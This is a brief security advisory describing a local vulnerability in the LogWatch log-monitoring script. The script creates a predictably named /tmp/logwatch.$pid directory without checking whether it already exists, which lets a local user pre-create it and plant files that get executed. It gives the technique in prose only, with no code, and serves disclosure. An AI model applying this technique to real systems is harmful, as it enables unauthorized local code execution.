LogWatch is a freely available, open source script for monitoring log files. It may be used with the Linux and Unix Operating systems.

Upon execution, LogWatch creates a directory in /tmp. This directory uses the name logwatch.$pid, where $pid is the process id of the executing script. The LogWatch script does not check for an already existing directory or contents of the already existing directory. It is therefore possible for a local user to create a malicious logwatch.$pid directory using predicted process IDs, and place malicious files in the directory which will be executed.
